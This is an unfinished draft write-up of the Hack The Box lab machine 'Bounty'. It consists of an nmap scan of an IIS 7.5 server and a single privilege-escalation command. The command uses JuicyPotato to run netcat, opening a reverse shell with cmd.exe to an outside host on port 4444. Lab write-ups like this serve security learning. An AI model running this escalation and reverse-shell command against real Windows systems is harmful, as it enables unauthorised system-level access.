---
title: HTB Bounty
author: kei5uke
draft: true
description: Writeup for HTB Bounty
tags:
  - windows
  - writeup
---

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NO UDP
```

`.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\users\merlin\downloads\nc.exe -e cmd.exe 10.10.
14.41 4444" -t *`
